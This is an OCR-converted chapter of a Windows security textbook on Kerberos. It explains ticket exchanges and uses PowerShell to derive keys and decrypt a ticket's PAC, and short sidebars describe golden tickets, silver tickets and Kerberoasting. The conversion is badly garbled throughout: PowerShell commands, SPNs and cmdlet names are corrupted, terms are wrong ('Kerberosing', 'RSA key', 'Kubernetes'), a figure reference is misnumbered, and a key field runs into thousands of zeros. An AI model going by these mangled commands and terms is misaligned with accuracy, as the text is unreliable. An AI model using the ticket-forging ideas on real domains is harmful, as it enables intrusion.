## 14. KERBEROS

![Figure](figures/WindowsSecurityInternals_page_487_figure_001.png)

In Windows 2000, the Kerberos authentication protocol replaced Netlogon as the primary mechanism for authenticating users on

a domain controller. This chapter builds upon the description of interactive domain authentication in Chapter 12 to explain how a user can authenticate to a Windows domain using Kerberos.

We'll start by looking at how Kerberos works, including how to generate the encryption keys used in the protocol, and decrypt Kerberos authentication tokens. Once you understand the inner workings of the protocol, we'll cover the delegation of authentication and the role of Kerberos in user-touser authentication protocols.

Kerberos was first developed at Massachusetts Institute of Technology (MIT) in the 1980s. Microsoft uses version 5 of the protocol, which was formalized in RFC1510 in 1993, then updated in RFC4120 in 2005. Microsoft has also made a few modifications to the protocol to support its own needs; I'll mention some of these changes over the course of this chapter.

---

## Interactive Authentication with Kerberos

As its primary function, Kerberos distributes tickets , each of which represents a user's verified identity. The system can use this identity to determine whether the user can access a service, such as a file server. For example, if the user sends their ticket in a request to open a file, the file server can check its validity, then decide whether to grant the user access through something like an access check.

Kerberos provides a means of distributing these tickets securely over an untrusted network and allowing the tickets to be verified. It does this by using shared encryption keys, commonly derived from a user's password, to encrypt and verify the tickets. The Active Directory server never stores the password in plaintext; it stores only the encryption key.

### Initial User Authentication

Figure 14-1 shows the initial Kerberos user authentication process between a client computer and the domain controller running the key distribution center (KDC) service. The KDC issues Kerberos tickets to users and manages session encryption keys.

![Figure](figures/WindowsSecurityInternals_page_488_figure_005.png)

Figure 14-1: An overview of Kerberos authentication

When the LSA processes a logon request, it first derives the shared encryption key based on the user's password and a salt $\textbf{\alpha}$ . It generates the salt based on values, such as the username and realm, that depend on the type of encryption algorithm in use. We use the term realm to describe the scope of the Kerberos authentication. In Windows, the realm is the DNS name for the domain that contains the user, such as mineral.local . We can combine the username and the realm to form a user principal name, commonly written with an arc symbol (@), as in user@mineral.local .

The LSA then generates an authentication service request (AS-REQ) message and sends it over the network to the authentication server . The authentication server is the part of the KDC that is responsible for issuing an initial ticket to the authentication process. The AS-REQ message contains the username and realm as well as pre-authentication data , which consists of the current time encrypted with the user's shared encryption key. The authentication

458    Chapter 14

---

server can look up the shared key from its key database using the specified username and realm, then use the key to decrypt the pre-authentication data . If it succeeds, it has verified that the data has come from the user, as only the server and the client should know the shared encryption key.

The authentication server then generates a ticket granting ticket (TGT) , which it encrypts with the shared encryption key for a special user, krbtgt . The authenticating user doesn't know the krbtgt user's shared key, so they can't decrypt the ticket. While the TGT has a special name, it's essentially just a ticket that verifies the user's identity to the ticket granting server (TGS) , which is responsible for issuing tickets for the user to authenticate to a network service. The ticket contains details about the user's identity encoded in a privilege attribute certificate (PAC) , as well as a randomly generated session key for the TGS to use. We'll see an example of a PAC in “ Decrypting the AP-REQ Message ” on page 469.

The authentication server also generates a second data value and encrypts it with the user's shared encryption key. This value, when decrypted, contains details about the ticket, such as how long it's valid for. Eventually, a ticket expires, and the user will need to request a new TGT. This second value also contains the session encryption key, encrypted in the ticket. The authentication server packages the encrypted ticket and ticket information into the authentication service reply (AS-REP) message and sends it back to the client LSA ❶ . Figure 14 - 2 summarizes the format of this message.

![Figure](figures/WindowsSecurityInternals_page_489_figure_003.png)

Figure 14-2: The AS-REP message format

Once the LSA receives the AS-REP, it can decrypt it and extract the session key from the encrypted ticket information by using the user's shared encryption key. The successful decryption also demonstrates that the LSA is communicating with the correct authentication server, as another server wouldn't know the user's shared key.

---

But the LSA still doesn't know all of the user's information, as this information is stored in the PAC, which is encrypted in the ticket. To get the PAC, the LSA must request a ticket for itself from the TGS ❸. To do so, the LSA packages up the TGT, which it can't alter, with the service principal name (SPN) of the service it wants to access. The SPN is a string of the following form:

```bash
service class/instance name/service name
```

The service class is the type of service to use. The instance name is the hostname or network address that the service is running on. Finally, the service name is an optional value for disambiguating similar services on the same host. For the LSA to request a ticket for itself, it must set the service class to HOST and the instance name to the current host, such as graphite_mineral.local . When converted to a string, this creates the following SPN: #HSM /graphite_mineral.local .

You might remember that we used this string format to specify a target name for NTLM authentication in Chapter 13. In fact, Windows took this format from Kerberos and applied it to NTLM to try to counter NTLM relay attacks.

To ensure that the server can verify its request, the LSA will also generate a cryptographic hash of the TGT. This hash encompasses the SPN, a timestamp, and a unique sequence number, all encrypted with the session key from the AS-REP's encrypted data value. This additional encrypted value is called the authenticator . The TGT, SPN, and authenticator are packaged up in a ticket granting service request (TGS-REQ) message and sent to the TGS. Figure 14 - 3 summarizes the format of this message.

![Figure](figures/WindowsSecurityInternals_page_490_figure_005.png)

Figure 14-3: The TGS-REQ message format

460    Chapter 14

---

The TGS receives the TGS-REQ message, and because it knows the shared encryption key for the krbgt user, it can decrypt the TGT. This allows it to extract details about the user, as well as the session key. It can then verify that the ticket hasn't expired or isn't otherwise invalid (which would be the case if the user weren't allowed to authenticate to the domain or service).

The TGS can use the session key from the ticket to decrypt the authenticator and verify that the hash matches the associated information. This process ensures that only a user with access to the shared encryption key could have extracted the session key from the AS-REQ and encrypted the contents of the authenticator for this TGT. The TGS then verifies that the timestamp is recent. Typically, it will reject the request if the timestamp is older than five minutes. For this reason, it's crucial to Kerberos authentication that the client and server systems have synchronized clocks. The TGS also checks that it hasn't already seen the ticket's sequence number. This check counters replay attacks, in which the same TGS-REQ is sent multiple times.

If all the checks pass, the TGS can look up the SPN in the key database to retrieve an encryption key. Technically, each SPN could have its own encryption key, but Active Directory usually just maps these SPNs to a user or computer account. For example, the H057/graphite.mina2.local.SPN is mapped to the computer account for the GRAPHITE machine. You can query the SPNs an account is mapped to using the setspn utility or the Get-ADComputer PowerShell command, as shown in Listing 14-1.

```bash
PS> Get-ADComputer -Identity $env:COMPUTENAME -Properties
ServicePrincipalNames | Select-Object -ExpandProperty ServicePrincipalNames
HOST/GRAPHITE
TERMSRV/GRAPHITE.mineral.local
RestrictedKrbHost/GRAPHITE.mineral.local
HOST/GRAPHITE.mineral.local
TERMSRV/GRAPHITE
RestrictedKrbHost/GRAPHITE
```

Listing 14-1: Enumerating SPNs mapped to the current computer account

Assuming the host exists, the TGS can extract the shared encryption key for the H0ST service ticket it will generate. If you return to Figure 14-1, you'll see that the TGS will copy the PAC from the decrypted TGT into this new ticket and encrypt it with the session key for the SPN . The TGS generates the same encrypted data as it did with the AS-REP, including the session key for the service to use. Then it packages the new ticket and the encrypted value into the ticket granting service reply (TGS-REP) and returns it to the client . Figure 14-4 summarizes the format of the TGS-REP message.

---

![Figure](figures/WindowsSecurityInternals_page_492_figure_000.png)

Figure 14-4: The TGS-REP message format

The LSA can now verify that it can decrypt the contents of the ticket and ensure the ticket targets the HOT SPN it requested. In particular, as the last step in Figure 14-1, it uses the PAC to create the new user's Token object . This completes the authentication process. The user has now been authenticated, and the system can start its logon session, console session, and processes.

## GOLDEN TICKETS

The Kerberos protocol relies on keeping the shared encryption keys secret. If an attacker gets hold of the shared keys or the passwords from which they're derived, they could generate their own Kerberos tickets with any security information they like.

One attack that uses this approach involves forging a golden ticket . This is possible when the krbtgt user's encryption key has been disclosed. This allows the attacker to encrypt a TGT with their own PAC, then use it to make a request to the TGS for a service ticket. As the ticket has been correctly encrypted, the TGS will verify it and issue a ticket for any target service with the user information from the TGT's PAC. For example, you could craft a service ticket with a domain administrator PAC to gain complete access to any system in a domain.

Getting the krbqt encryption key usually requires compromising a domain controller and extracting the key from there. Doing this might seem reductive, because if you compromise the domain controller, you can already control ticket issuance, but there are still advantages to gaining the krbqt key. For

462    Chapter 14

---

example, there could be multiple domain controllers on an enterprise network, and these domains will share a krbtgt encryption key. So, an attacker could compromise the weakest configured system, extract the key, and use it to mount a wider attack on the network to compromise all domain controllers. This is why Microsoft and the industry recommend rotating the krbtgt key regularly, and have provided scripts to do this in a safe manner.

## Network Service Authentication

Once the user has been authenticated to the local machine, the LSA must cache the following information before the user can communicate with other services on the network: the user's shared encryption key, which is based on their password; the TGT, to request additional service tickets; and the TGT session key.

The SSPI APIs discussed in the previous chapter include a Kerberos security package that handles the network service authentication process to retrieve a valid ticket for a network service based on its SPN. Figure 14 - 5 provides an overview of the process of getting a ticket for a network service.

![Figure](figures/WindowsSecurityInternals_page_493_figure_004.png)

Figure 14-5: Kerberos authentication to a network service

This authentication process involves three systems: the client, the server, and the KDC. The first thing the client does is call the InitializeSecurity context SSPI API with the user credentials and the network service's SPN .

Kerberos 463

---

In Figure 14 - 5 , we're assuming that we're making the authentication request as an existing authenticated user with a cached TGT. If we're not, and we've specified a username and password, the LSA needs to get the TGT for that user by following the authentication process outlined in the previous section. If the LSA already has a valid TGT, it can make a request to the TGS for a new ticket targeting the specified SPN ❷ .

The TGS then verifies that the TGT is valid and that the caller knows the session key, which it can extract with knowledge of the user's shared key. Once it has verified this value, the TGS looks up the shared encryption key for the target SPN. If the SPN doesn't exist or the user isn't allowed to use the service, it returns an error, which the LSA will report to the caller. If everything occurs correctly, the TGS will generate the TGS-REP message with the new ticket and return it to the client's LSA.

As with the original TGT, the TGS encrypts the ticket using a key the client shouldn't have access to. However, it encrypts the extra encrypted value using the TGT's session key, which the LSA can decrypt. This encrypted value contains the session key for communicating with the service. The LSA takes the ticket and generates an authenticator encrypted with the service session key, then packages the ticket and authenticator into an authentication protocol request (AP-REQ) message. The structure of this message is basically the same as that of the TGS-REQ message, but the request is sent to the service rather than the TGS.

The LSA returns this AP-REQ to the user ❶ . At this point, the client application regains control of the authentication process, and it can package up the AP-REQ into the network protocol and transmit it to the server ❷ . The server extracts the AP-REQ and passes it to its own LSA via the AcceptSecurityContext API ❸ .

The LSA on the server should already have the shared encryption key for the cached ticket. It's common to tie the SPN to the computer account used by the Local System user. Therefore, any privileged service, such as the SMB server, should have access to the computer's password needed to decrypt the ticket. If the service is running as a user, the system must have configured an SPN mapping for that user before the ticket can be accepted.

Assuming it can decrypt and verify the ticket, the server's LSA will then extract the PAC from the ticket and build a local token for the user. The PAC has a signature that the server can use to verify that it hasn't been tampered with. Also, an optional verification process can ensure that the PAC was issued by the KDC . The network service can now use the generated token to impersonate the authenticating user.

The final step in Figure 15-1 is optional. By default, the server doesn't need to return anything to the client to complete the authentication; it has everything it needs to decrypt the ticket and let the service access the user's identity. However, you might want to ensure that the server you're talking to knows the ticket's key and isn't lying. One way that the server can prove it knows the encryption key is to encrypt or sign something using the ticket's session key and return this to the client. We refer to this practice as mutual authentication.

Kerberos uses the authentication prompt reply (AP-REP) message to send this encrypted value back to the client . The AP-REP message contains an authenticator value like the one sent in the AP-REQ, but it has a slightly

464    Chapter 14

---

different format, as it is encrypted using the session key. Because only a valid recipient of the ticket could have decrypted the session key to encrypt the authenticator, this verifies the server's identity.

### SILVER TICKETS AND KERBEROASTING

A silver ticket is a more limited type of forged ticket than the golden ticket, but it's potentially easier to obtain. This attack uses a service's shared encryption key instead of the krbqt key to forge a ticket for a service without requesting it from the domain controller. The contents of the ticket, including the PAC, can impersonate any domain user, including privileged users. Note that this PAC modification works only if the server doesn't verify it with the KDC. This verification is generally not enabled when the server is running as a privileged user such as SYSTEM.

How would an attacker get the shared encryption key for a service? They might have previously compromised the server and extracted the service key from the LSA. If the key hasn't changed, it could enable a long-term compromise of a service. Another approach is to brute-force the password used to derive the encryption key. If the attacker can guess a password, they could encrypt a service ticket and check whether the service accepts it.

A more efficient attack, called Kerberosing, takes advantage of the fact that the service ticket requested from the TGS is already encrypted using the service's key. The attacker can request a service ticket for their target, then use the returned information used to mount an affine brute-force attack against the password. We'll cover an example of Kerberosing in this chapter's worked examples.

## Performing Kerberos Authentication in PowerShell

How much of the network service authentication process can we observe


from PowerShell? Let's find out. We'll start by getting the credentials han

dle, as shown in Listing 14-2.

```bash
# PS> $credout = New-LsaCredentialHandle -Package "Kerberos" -UseFlag Outbound
# PS> $sbn = "HOST:/env:COMPUTENAME"
# PS> $client = New-LsaClientContext -CredHandle $credout -Target $sbn
# PS> $Format-LsaAuthToken -Token $client.Token
# <KerberosV5 KRB_AP RED>
# Options
#   : None
# <Ticket>
#Ticket Version : 5
# ServerName      : SRV_INST - HOST/GRAPHITE
# Realm            : MINERAL_LOCAL
# Encryption Type : AES256_CTS_HMAC_SHA1_96
# Key Version      : 1
# Cipher Text      :
```

Kerberos 465

---

```bash
00000000: B2 9F B5 0C 7E D9 C4 7F 4A DA 19 CB B4 98 AD 33
00000010: 20 3A 2E C3 35 OB F3 FE 22 FT AF 7D E0 00 2B F2 54
--snip--
00000410: B7 52 F1 0C 7F 0A C8 5E 87 AD 54 4A
<Authenticator>
Encryption Type : AES256_CTS_HMAC_SHA1_96
Cipher Text   :      :
00000000: A4 9E 55 CB 40 41 27 05 D0 52 92 79 76 91 4D 8D
00000010: A1 F2 56 D1 23 1F BF EC 7A 60 14 0E 00 B6 AD 3D
--snip--
00000190: 04 D4 E4 5D 18 60 DB C5 FD
```

Listing 14-2: Setting up a client authentication context for Kerberos

In this case, we specify the kerberos package ❶ instead of the NLU package we used in the previous chapter. Once we receive the handle, we can create a client authentication context. To do this, we must specify an SPN to authenticate to; here I've picked the #DNS SPN on the local computer ❷.

At this point, the LSA should get a ticket for the service by using the previously negotiated TGT and sending a TGS-REQ. If the SPN is incorrect or unknown, the TGS will return an error, which the LSA will pass back to us when it creates the client authentication context. The error will look like the following:

```bash
(0x80090303) - The specified target is unknown or unreachable
```

In Listing 14-2, the only thing we receive is the AP-REQ $\textbf{ø}$; we don't receive the TGS-REQ or the TGS-REP. Because we formatted the fields of the Kerberos authentication token, we can see only the values available in plaintext. This includes a set of option flags currently set to ?one; other values would indicate various properties of the request, which we'll come back to when we discuss configuring the optional mutual authentication.

The ticket also contains the target SPN and realm ❸, which the server needs to select the correct shared encryption key. You can recognize an SPN based on the presence of the SRV INST name type, which indicates an service instance.

Next, the ticket specifies the encryption parameters. First it lists the algorithm used to encrypt and verify the ciphertext. In this case, it uses AES ciphertext-stealing mode (CTS) with a 256-bit key for encryption and a SHA1 HMAC truncated to 96 bits . Table 14-1 shows other common encryption algorithms used by Windows.

Table 14-1: Common Kerberos Encryption Types on Windows

<table><tr><td>Name</td><td>Encryption</td><td>Verification</td></tr><tr><td>AES256_CTS_HMAC_SHA1_96</td><td>AES CTS 256-bit</td><td>SHA1 HMAC truncated to 96 bits</td></tr><tr><td>AES128_CTS_HMAC_SHA1_96</td><td>AES CTS 128-bit</td><td>SHA1 HMAC truncated to 96 bits</td></tr><tr><td>DES_CBC_MD5</td><td>DES 56-bit</td><td>MD5 HMAC</td></tr><tr><td>ARCFOUR_HMAC_MD5</td><td>RC4</td><td>MD5 HMAC</td></tr></table>


466    Chapter 14

---

Notice that the ticket contains the key version number 0 . When a user or computer changes its password, the shared encryption key must also change. To ensure that the system selects the correct key, it stores this version number with the password-derived key and increments it upon every key change. In this case, the version is 1, which means the computer has never changed its password.

The presence of the key version number indicates that the ticket is encrypted with a long-lived shared encryption key. A missing version number would indicate that the ticket was encrypted with a previously negotiated session key. Because we're looking at the first message being sent to the service as part of this authentication process, the client and service do not currently share any session key, so the client must use the computer's shared encryption key.

The encrypted ciphertext follows the key information. Since we don't know the encryption key, we can't decrypt it. Following the ticket is the authenticator , which also starts by listing key information. Notice the lack of a key version number; it's missing here because the authenticator is encrypted with the session key inside the ticket.

## NOTE

In this case, because we've generated a ticket targeting the computer we're currently running on, we could extract the computer account encryption key, either by directly accessing it in memory or from the MACHINE. ACCS LSA secret in the registry. This process is outside the scope of this chapter.

We can complete the authentication process by passing the client authentication token to a server authentication context, in the same way we did when using NTLM authentication in Chapter 13. Listing 14-3 demonstrates this.

```bash
PS> $credin = New-LsaCredentialHandle -Package "Kerberos" -UseFlag Inbound
PS> $Server = New-LsaServerContext -CredHandle $credin
PS> Update-LsaServiceContext -Server $server -Token $client.Token
Exception calling "Continue" with "i" argument(s):
        "(0x8009090c) - The logon attempt failed"
```

Listing 14-3: Completing the Kerberos authentication

We set up the server authentication context, then update the context with the client's authentication token. However, when we call the @date-lsa ServerContext PowerShell command, the authentication fails with an error. Perhaps this shouldn't come as a massive surprise. Only the Local System user has direct access to the shared encryption key for the computer account used for the @test SPN. Therefore, when the LSA verifies the AP-REQ, it can't decrypt it and returns an error.

Can we find an SPN that we can negotiate locally? Windows specifies a RestrictedKBlast service class. The SPN for the local computer with this service class is mapped to the computer account, so the ticket is once again encrypted using the computer account's key. However, the LSA treats the service class specially and will allow any user on the system to decrypt it,

---

unlike with HOST. When we change the command to use the restricted service class instead, we get the output shown in Listing 14-4.

```bash
0  $credout = New-LsaCredentialHandle -Package "Kerberos" -UseFlag Outbound
0  $sbn = "RestrictedKrbHost/$env:COMPUTERNAME"
0  $client = New-LsaClientContext -CredHandle $credout -Target $sbn
0  $ps = Format-LsaAuthToken -Token $client.Token
  <KerberosV5 KRB_AP_REQ>
  Options      : None
  <Ticket>
  Ticket Version : 5
0  $serviceName     : SRV_INST - RestrictedKrbHost/GRAPHITE
  --snip--
  PS  $credin = New-LsaCredentialHandle -Package "Kerberos" -UseFlag Inbound
  PS  $server = New-LsaServerContext -CredHandle $credin
  PS  Update-LsaServerContext -Server $server -Token $client.Token
  PS  Use-NtObject($token = Get-LsaAccessToken $server) {
    Get-NtLogonSession $token | Format-Table
0  $logonId        UserName      LogonType SessionId
  ---------          ----------------- -----------------
     00000000-01214512 MINERAL\alice Network   0
  Listing 14-4: Authenticating using the RestrictedKrbHost SPN
```

Here, we change the SPN to use the RestrictedOrBest service class for the current computer name ❶ . We then complete the authentication, as in Listings 14-2 and 14-3. Note the change in the SPN provided in the AP-REQ message ❷ . This time, when we update the server authentication context the operation succeeds, so we can extract the generated Token object and display the logon session ❸ .

In Listing 14-5, we test mutual authentication and view the returned AP-REP message.

```bash
♦ PS> $client = New-LsaServerContext -CredHandle $credout
    -Target "RestrictedXkbHost/Serv:COMPUTERNAME" -RequestAttribute MutualAuth
  PS> Format-LsaAuthToken -Token $client.Token
  <KerberosV5 KRB_AP_REQ>
  ♦ Options      : MutualAuthRequired
    --snip--
  PS> $server = New-LsaServerContext -CredHandle $credin
  PS> Update-LsaServerContext -Server $server -Token $client.Token
  PS> $ap_rep = $server.Token
  PS> $ap_rep | Format-LsaAuthToken
  ♦ <KerberosV5 KRB_AP_REQ>
  <Encrypted Part>
  ♦ Encryption Type : AES256_CT_HMAC_SHA1_96
  Cipher Text : :
  00000000: 32 E1 3F FC 25 70 51 29 51 AE 4E AC B9 BD 88 72
    --snip--
  Listing 14-5: Enabling mutual authentication
```

468 Chapter 14

---

We enable mutual authentication by specifying the MutualAuth request attribute flag when creating the client authentication context ❶ . In the AP-REQ message, we see that a MutualAuthRequired flag is set ❷ , which requires the service to return an AP-REP message. When we format the server's authentication token, we see the AP-REP message, which contains only an encrypted value ❸ . The encryption key information ❸ doesn't have a key version number, as this is encrypted by the session key, not a shared encryption key.

## Decrypting the AP-REQ Message

Once we receive an AP-REQ message, we'll want to decrypt it. But so far, we've encrypted all the tickets in our examples using a key derived from the computer's password. While we might be able to extract this password for use in the decryption operation, doing so would require a lot of additional work. How can we decrypt the ticket for the AP-REQ message with the least amount of effort?

One approach is to specify an SPN that causes the TGS to use our own password. We can then derive the encryption key based on the account password we control to decrypt the ticket. You can add an SPN to your user account using the setspn utility or the Set-AllUser PowerShell command. You'll need to do this as a domain administrator; otherwise, you won't have the Active Directory access necessary to configure it. The following command adds the SPN http/grapitie to the alive user:

```bash
PS> Set-ADUser -Identity alice -ServicePrincipalNames @{Add="HTTP/graphite"}
```

You can also use this command to remove SPNs by changing 4dd to

Remove. The SPN can be almost arbitrary, but it's a best practice to stick to known service classes and hosts.

We can now run the script to perform the authentication with the new SPN. Listing 14-6 shows the resulting AP-REQ.

```bash
PS> $credout = New-LsaCredentialHandle -Package "Kerberos" -UseFlag Outbound
PS> $client = New-LsaClientContext -CredHandle $credout -Target
"HTTP/graphite"
PS> Format-LsaAuthToken -Token $client.Token
<KenberosVS KRB_AP REQ>
  Options      : None
  <Ticket>
  Ticket Version  : 5
  Server Name    : SRV_INST - HTTP/graphite
  Realm        : MINERAL_LOCAL
  Encryption Type : ARCFOUR_HMAC_MD5
Key Version    : 3
Cipher Text     :
00000000: 1A 33 03 E3 04 47 29 99 AF B5 E0 5B 6A 9A B0 D9
00000010: BA 7E 9F 84 C3 BD 09 62 57 B7 FB F7 86 3B D7 08
--snip--
00000410: AF 74 71 23 96 D6 30 01 05 9A 89 D7
```

Kerberos 469

---

```bash
<Authenticator>
Encryption Type: ARCFOUR_HMAC_MD5
Cipher Text    :      :
00000000: 72 30 A1 25 F1 CC DD B2 C2 7F 61 8B 36 F9 37 B5
00000010: 0C D8 17 6B BB 60 D3 04 6E 3A C4 67 68 3D 90 EE
--snip--
00000180: 5E 91 16 3A 5F 7B 96 35 91
```

Listing 14-6: The AP-REQ for the HTTP/graphite SPN

If you examine this output, you'll see that not much has changed, but we can at least confirm that the ticket relates to the SPN we specified. This means we can request a ticket for the service that should map to the user. One other change is that the encryption type is now RC4 rather than AES. This is due to an odd behavior of Kerberos in Windows: when the SPN is assigned to a user, the encryption type defaults to RC4. This is good news for us, as RC4 is much simpler to decrypt, as you'll soon see. Note also that the key version number is set, indicating that the ticket is encrypted with the shared encryption key.

Before we can decrypt this ticket, we need to generate a key for the encryption algorithm. Generating an RC4 key is easy: we simply calculate the MD4 hash of the Unicode password on which it is based. We've seen this operation before: this key is identical to the NT hash used in NTLM, and not by coincidence. When Microsoft introduced the RC4 algorithm into Kerberos, it used the NT hash to support existing users without requiring them to update their passwords to generate new encryption keys. The use of the RC4 algorithm also circumvents difficulties involving cryptography export restrictions.

If we supply the user's password, we can generate the RC4 Kerberos key using the Get-Kerberos PowerShell command, as shown in Listing 14-7.

```bash
PS > $key = Get-KerberosKey -Password "Alice Password" -KeyType ARCFOUR_HMAC_MD5
-NameType SRV INST -Principal "HTTP/graphite@mineral.local" |
PS > $key.Key | Out-HexDump
C0 12 36 B2 39 0B 9E 82 EE FD 6E 8E 57 E5 1C E1
```

Listing 14-7: Generating an RC4 Kerberos key for the SPN

Note that you must use the valid password of the user account with which you're running the example.

## GENERATING AES KEYS

Generating an RSA key from a password is easy, as the final key relies on no other information. Nevertheless, this design leads to some interesting problems: for example, if two accounts share the same password, they can decrypt each other's tickets. Also, the decryption implementation in the PowerShell module

---

can brute-force a key in cases where the principal is incorrect or the key number doesn't match.

However, AES keys are a different matter. AES uses the Password-Based

Key Derivation Function 2 (PBKDFv2) algorithm to calculate an intermediate key

based on the password, then uses this key to generate the final key. PBKDFv2

needs three values to generate the intermediate key: the password, a salt value

to make the key harder to brute-force, and the number of iterations for which

the generation algorithm should execute.

By default, the algorithm uses 4,096 iterations, and it derives the salt from the principal name by concatenating the uppercase form of the realm with the client's name. For example, alice@mineral.local would create the salt MINERAL. LOCAL:alice, while the SPN we used, HOST/graphite@mineral.local, would generate MINERAL.LOCALhostgraphite. Using just the SPN to derive the key will produce an incorrect result, so you should specify the salt explicitly when calling Get-KerberosKey, as shown here:

```bash
PS: Saes key = Get-KerberosKey -Password "AlicePassword"
-KeyName AES256 CTS HMAC SHA1_96 -NameType SRV INST
-Principal "HTTP!graphite@mineral.local" -Salt "MINERAL.LOALALACE"
PS: Saes key = | Out-HexDump
CF 30 3E 2D BB FA 29 1D EF 87 C1 79 B2 18 7A AD
D8 38 77 27 51 C2 5E C3 88 D8 01 CC AC 0A A9
```

We can now pass the AP-REQ authentication token and the key to the Unprotect-LSaAuthToken PowerShell command to decrypt the ticket and authorenticator. By passing the decrypted authentication token to the Format -LSaAuthToken command, we can display the unprotected information.


As the decrypted ticket is quite large, we'll inspect it in parts, starting in Listing 14-8.

```bash
PS> $ap_rep = Unprotect-LsaAuthToken -Token $client.Token -Key $key
PS> $ap_rep | Format-LsaAuthToken
   <KerberosV5 KRB_AP_RED>
     Options        : None
     <Ticket>
     Ticket Version  : 5
     Server Name    :  SRV_INST - HTTP/graphite
     Realm          :  MINERAL_LOCAL
     Flags          :  Forwardable, Renewable, PreAuthent, EncParRep
❶ Client Name    :  PRINCIPAL - alice
         Client Realm    :  MINERAL_LOCAL
❷ Auth Time       :  5/12 5:37:40 PM
         Start Time      :  5/12 5:43:07 PM
         End Time        :  5/13 3:37:40 AM
         Renew Till Time :  5/19 5:37:40 PM
```

Listing 14-8: The basic decrypted ticket information

Kubernetes 471

---

The unencrypted ticket begins at the Real value. Most of what follows is bookkeeping information, including flags that do things like indicate the fact that pre-authentication occurred (PREAUTH). The FORWARD flag is related to delegation, a topic we'll come back to in "Kerberos Delegation" on page 479 . The ticket also contains the SPN of the user being authenticated . Because the alice user requested the ticket for the HTTP/graphite service, this user's information is what is being authenticated. Next, we see that the ticket has a limited lifetime, in this case based on the authentication time . An end time, making it valid for around 10 hours. When the ticket expires, the client can renew it for another five days. (The Renewable flag encodes information about the ability to renew the ticket.)

Listing 14-9 shows the next component of the ticket: the randomly generated session key.

```bash
<Session Key>
Encryption Type : ARCFOUR_HMAC_MD5
Encryption Key  : 27BD4DE38AD7B7D08F03500DF116A85
```

Listing 14-9: The ticket session key

This session key is used to encrypt the authenticator. The client and server might also use it to encrypt and verify any subsequent keys or data they transmit.

After this is a list of authorization data values that the server can use to determine the security properties of the client user. The most important of these is the PAC, which contains everything the receiving Windows system needs to build a token object for the user. The PAC is itself split into multiple parts. Listing 14-10 contains its logon information.

```bash
<Authorization Data - AD_WIN2K_PAC>
<PAC Entry Logon>
<User Information>  ⚠
Effective Name  : alice
Full Name      : Alice Roberts
User SID        : S-1-5-21-1195776225-522706947-2538775957-1110
Primary Group : MINERAL\Domain Users
Primary Group SID: S-1-5-21-1195776225-522706947-2538775957-513
<Groups> ⚠
MINERAL\Domain Users            - Mandatory, EnabledByDefault, Enabled
<Resource Groups> ⚠
Resource Group   : S-1-5-21-1195776225-522706947-2538775957 ⚠
MINERAL\Local Resource       - Mandatory, EnabledByDefault, Enabled, Resource
<Extra Groups> ⚠
NT AUTHORITY\Claims Valid           - Mandatory, EnabledByDefault, Enabled
Authentication authority asserted identity - Mandatory, EnabledByDefault, Enabled
<Account Details> ⚠
Logon Time      : 5/12 5:37:15 PM
Password Last Set: 5/8 11:07:55 AM
Password Change  : 5/9 11:07:55 AM
Logon Count      : 26
Bad Password #  : 0
```

472    Chapter 14

---

```bash
Logon Server    : PRIMARYDC
Logon Domain    : MINERAL
Logon Domain SID: 5-1-5-21-1195776225-522706947-2538775957
User Flags       : ExtrasAidsPresent, ResourceGroupsPresent
User Account Cntl:   NormalAccount, DontExpirePassword
Session Key      : 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
```

Listing 14-10: The logon PAC entry

The logon PAC entry follows the format used in the Netlogon protocol prior to Windows 2000. It starts with basic user information ❶ , such as the user's name, SID, and primary group. Next comes the list of group memberships, split into three parts: domain groups ❷ , resource groups ❸ and extra groups ❹ . For each group, the SID (formatted as a name if known) and the attributes that should apply to it are shown. For size reasons, the domain and resource group SIDs are only stored using the last RID value. The full SIDs are derived by adding this RID to the logon domain SID ❸ or the resource group SID ❹ , respectively. The extra groups list stores the full SIDs and so can contain SIDs with different prefixes.

After the group information is additional bookkeeping about the user, such as when they last logged on and changed their password . This section also includes information about the server and domain that authenticated the user, including the domain name and SID. The user flags show that the extra and resource groups are present in the ticket. The user account control flags indicate properties of the account (in this case, that the user's password doesn't expire).

